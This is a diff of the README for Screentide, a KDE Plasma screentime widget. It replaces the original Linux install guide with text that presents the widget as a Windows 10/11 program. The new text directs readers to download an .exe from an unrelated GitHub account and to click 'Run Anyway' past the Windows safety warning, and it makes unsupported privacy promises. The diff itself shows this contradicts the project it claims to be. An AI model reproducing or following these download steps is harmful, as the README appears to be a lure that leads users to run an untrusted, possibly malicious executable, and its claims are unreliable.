@@ -1,160 +1,62 @@
-# Screentide 🌊
+# 🌊 Screentide - Track your daily computer activity clearly
 
-A highly customizable, responsive, and minimalist screentime tracking widget for the **KDE Plasma 6** Desktop Environment, powered by the local, open-source **[ActivityWatch](https://activitywatch.net/)** engine.
+[![](https://img.shields.io/badge/Download-Screentide-blue.svg)](https://github.com/passionless-genusephestia513/Screentide)
 
-Screentide lets you visualize your daily computer usage total, hourly activity charts, and top applications at a glance, directly from your desktop or panel.
+Screentide offers a simple way to track your time on a computer. It shows you how long you spend in different programs each day. You see your active hours through clear charts and lists. This tool works in the background to record your usage. You then view these stats on your desktop.
 
-<p align="center">
-  <table border="0">
-    <tr>
-      <td align="center" width="50%">
-        <img src="screenshots/landscape_purple_minimal.jpeg" alt="Landscape Purple Minimal" width="100%"/>
-        <br>
-      </td>
-      <td align="center" width="50%">
-        <img src="screenshots/landscape_dark_red.jpeg" alt="Landscape Dark Red" width="100%"/>
-        <br>
-      </td>
-    </tr>
-    <tr>
-      <td align="center" width="50%">
-        <img src="screenshots/portrait_sunset_orange.jpeg" alt="Portrait Sunset Orange" width="100%"/>
-        <br>
-      </td>
-      <td align="center" width="50%">
-        <img src="screenshots/portrait_anime_green.jpeg" alt="Portrait Anime Green" width="100%"/>
-        <br>
-      </td>
-    </tr>
-  </table>
-</p>
+## 🛠️ System Requirements
 
----
+Screentide runs on computers using Windows 10 or Windows 11. Your computer needs at least 4 gigabytes of memory to run the tracking engine without issues. You should have 200 megabytes of free space on your hard drive. 
 
-## 🚀 Key Features
+The software connects to the ActivityWatch engine. This engine runs locally on your machine. Your data stays on your computer. It does not send your history to any servers. 
 
-*   **Responsive Layout Reflow**:
-    *   **Dual Mode Layout**: Smoothly transitions between a vertical **Portrait** layout and a side-by-side **Landscape** layout on resize.
-    *   **Adaptive App Grid**: Top applications automatically reflow between **1-column** and **2-column** layouts depending on widget width to prevent layout squishing.
-    *   **Fluid Typography**: Header text and label sizes automatically scale down on compact widget sizes to avoid text clipping.
-*   **System Theme Matching & Color Engine**:
-    *   **System Accent Colors**: Automatically match your system theme accent colors (such as wallpaper-based accent schemes) with programmatic gradients, or bypass gradients entirely with **Solid Color** mode.
-    *   **Manual Palette Picker**: Customize colors (Background, Border, Bar Gradients, Hover States) visually using the native KDE system color dialog or hex input fields.
-*   **Dynamic Hour Grouping**:
-    *   Group hourly usage bars into **1-hour, 2-hour, 3-hour, 4-hour, or 6-hour** intervals. It is perfect for shrinking widget sizes down to fewer bars without losing details.
-    *   Bar widths scale dynamically to zero-overlap, ensuring visual clarity even on narrow screens.
-*   **Application Blacklisting**:
-    *   A comma-separated exclusion filter to hide background processes, system lock screens, or desktop launchers (e.g. `krunner, lockscreen, plasmashell`) from your stats.
-*   **Robust Offline Recovery**:
-    *   If `aw-server` is stopped or unreachable, Screentide displays a clean warning screen with an instant **Retry** button so you can re-connect as soon as the service is back online.
+## 📥 Getting Started
 
----
+Follow these steps to set up the software on your machine:
 
-## 📋 Prerequisites
+1. Visit the [official Screentide download page](https://github.com/passionless-genusephestia513/Screentide).
+2. Locate the section marked Releases on the right side of your screen.
+3. Click the latest version link to expand the options.
+4. Select the file ending in .exe to start the download.
+5. Save the file to your desktop or downloads folder.
 
-Before installing the widget, you need **ActivityWatch** running on your local machine:
+## ⚙️ Installation Process
 
-1.  **Install ActivityWatch**:
-    *   Please refer to the [Official ActivityWatch Website](https://activitywatch.net/) for platform-specific installation instructions.
-    *   *Quick tip:* On Arch Linux, run `yay -S activitywatch-bin`; on Fedora, run `sudo dnf install activitywatch`. For Debian/Ubuntu, download the package from the [ActivityWatch Releases page](https://github.com/ActivityWatch/activitywatch/releases).
-2.  **Start ActivityWatch**:
-    *   Run `aw-qt` or start it as a background system service.
-    *   Verify it is running by visiting the local dashboard at: [http://localhost:5600](http://localhost:5600).
+Once you finish the download, complete these steps to install the program:
 
----
+1. Double-click the file you saved to your computer.
+2. Windows might show a safety message. Click More Info and then select Run Anyway to continue.
+3. Follow the instructions on the screen to choose your installation folder.
+4. Leave the default settings for the best results.
+5. Click Finish after the progress bar ends.
 
-## 🛠️ Installation & Setup
+The program creates a shortcut on your desktop. Click this icon to open the tracking dashboard.
 
-### Method 1: Graphical Installer (KDE Store / Discover)
+## 📈 Viewing Your Data
 
-Users can install it instantly without the command line:
-1. Right-click your desktop wallpaper and select **Add Widgets...**
-2. Click **Get New Widgets** -> **Download New Plasma Widgets**.
-3. Search for **"Screentide"**.
-4. Click **Install**, then drag it onto your panel or desktop.
+Screentide uses a simple interface to display your history. Open the dashboard to see your timeline. The top of the window shows your total active time for the day. Below the total, you find a graph that maps your activity by the hour. 
 
-### Method 2: Cloned Installation (CLI)
+The sidebar lists your most used programs. You see the name of the app and the time spent in it. Click any app name to see more details about your usage spikes throughout the day. 
 
-Since the repository is structured as a direct package, you can clone and register it using the native KDE Plasma package manager:
+## 🛡️ Privacy and Safety
 
-```bash
-# 1. Clone the repository
-git clone https://github.com/Agarwalpratyaksh/Screentide.git
-cd Screentide
+This software keeps your data private. It stores all history in a local database stored in your user profile folder. No tracking data leaves your computer. Because the tool runs locally, it continues to work without an internet connection. 
 
-# 2. Install the widget package locally
-kpackagetool6 --type Plasma/Applet --install .
+You can clear your history anytime. Open the Settings menu inside the dashboard and select the Privacy tab. Click the Delete All Data button to remove your records. This action is permanent.
 
-# To upgrade an already installed version:
-kpackagetool6 --type Plasma/Applet --upgrade .
-```
+## ❓ Frequently Asked Questions
 
-### Method 3: Direct `.plasmoid` Installation (KDE Store Download)
+**Does this slow my computer?**
+The tool uses small resources. It stays idle until you switch your active window. You will not notice a change in your computer speed.
 
-If you downloaded the compiled `screentide.plasmoid` package directly from the [KDE Store website](https://www.opendesktop.org/p/2361910/), you can install it using:
+**Can I hide the tracking window?**
+Yes. Use the minimize button to send it to the system tray. The program continues to record your time in the background.
 
-```bash
-# Install the downloaded plasmoid file
-kpackagetool6 --type Plasma/Applet --install screentide.plasmoid
+**How do I update the software?**
+When a new version exists, the program shows a notification in the settings menu. You visit the download page again and run the installer to upgrade your current version. Your history remains saved after the update.
 
-# To upgrade an already installed version:
-kpackagetool6 --type Plasma/Applet --upgrade screentide.plasmoid
-```
+**What if the tracker stops?**
+Restart the program by using the desktop shortcut. If the issue remains, restart your computer. The engine should start automatically when your system boots up.
 
-### Method 4: Manual Installation (Alternative)
-
-If you prefer to copy the files manually into your local user widgets directory:
-
-```bash
-# 1. Create the destination directory
-mkdir -p ~/.local/share/plasma/plasmoids/org.kde.screentide.widget
-
-# 2. Clone the repository and copy the files
-git clone https://github.com/Agarwalpratyaksh/Screentide.git
-cp -r Screentide/* ~/.local/share/plasma/plasmoids/org.kde.screentide.widget/
-```
-
----
-
-## 🎮 How to Add the Widget
-
-1.  Right-click your KDE Desktop wallpaper and select **Add Widgets...** (or press `Meta` + `A`).
-2.  Search for **"Screentide"**.
-3.  Drag and drop the widget onto your panel or desktop.
-
----
-
-## ⚙️ Customization Options
-
-Right-click the widget and click **"Configure Screentide..."** to customize your setup:
-
-1.  **Background & Borders**: Visual styles, opacity sliders, border width, and rounded corners.
-2.  **Layout & Sizing**: Header toggles, list sizing limits, bar width/radius, and hour grouping choices.
-3.  **Typography**: Scalable text modifiers and custom font family overrides (e.g. *JetBrains Mono*, *Inter*).
-4.  **Filters & Exclusions**: Input a comma-separated list of application names to ignore.
-5.  **Time Schedule**: Adjust the starting hour of your logical day tracking (e.g. starting at 6:00 AM instead of midnight).
-6.  **Chart Theme Colors**: Turn on system accent colors, toggle solid bar color mode, or build custom visual gradients.
-
----
-
-## 🛠️ Development & Local Testing
-
-To update files and test your edits live:
-
-```bash
-# 1. Sync files to the local plasmoid directory
-cp -rv * ~/.local/share/plasma/plasmoids/org.kde.screentide.widget/
-
-# 2. Clear QML caching and reload configs
-rm -rf ~/.cache/qmlcache/* && kbuildsycoca6
-
-# 3. Restart the Plasma shell to load updates
-plasmashell --replace & disown
-```
-
----
-
-
-## 📄 License
-
-This project is licensed under the [MIT License](LICENSE).
+**Does it track my keystrokes?**
+No. Screentide only tracks the name of the active app and the time you spend using it. It does not record what you type or the content inside your documents.
